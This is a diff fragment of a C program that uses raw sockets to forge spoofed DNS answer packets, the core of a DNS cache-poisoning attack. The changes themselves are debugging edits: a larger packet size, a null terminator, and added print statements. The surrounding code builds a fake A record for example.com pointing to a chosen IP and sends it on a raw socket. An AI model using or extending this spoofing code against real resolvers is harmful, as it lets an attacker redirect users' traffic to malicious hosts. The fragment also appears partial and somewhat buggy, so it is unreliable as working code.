@@ -18,7 +18,7 @@
 #include <netinet/ip.h>
 
 // Constants
-#define PACKET_SIZE 512
+#define PACKET_SIZE 1024
 #define DNS_PORT 53
 
 // DNS Header structure
@@ -116,24 +116,23 @@ int full_spoofed_answer(uint txid, uint d_port) {
 
     // Add question and answer
     char *qname = (char *)(buffer + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dns_header));
-    strcpy(qname, "\7example\3com");
+    strcpy(qname, "\7example\3com\0");
     struct dns_question *qinfo = (struct dns_question *)(qname + strlen(qname) + 1);
     qinfo->qtype = htons(1);  // A type
     qinfo->qclass = htons(1); // IN class
 
     struct dns_rr *ans = (struct dns_rr *)((char *)qinfo + sizeof(struct dns_question));
     printf("domain address is %p\n", &domain);
-    printf("pointer to domain name is %p\n", 0xC00C);
     ans->name = htons(0xC00C); // Pointer to domain name
     ans->type = htons(1);      // A record
     ans->_class = htons(1);    // IN class
     ans->ttl = htonl(3000);     // TTL
     ans->data_len = htons(4);  // IP length
     ans->rdata = inet_addr(resolved_ip);
-
+    printf("got here entring the checksum\n");
     // Calculate IP checksum
     iph->check = checksum((unsigned short *)buffer, iph->tot_len);
-
+    printf("got here exit the checksum\n");
     // Create socket
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sock < 0) {
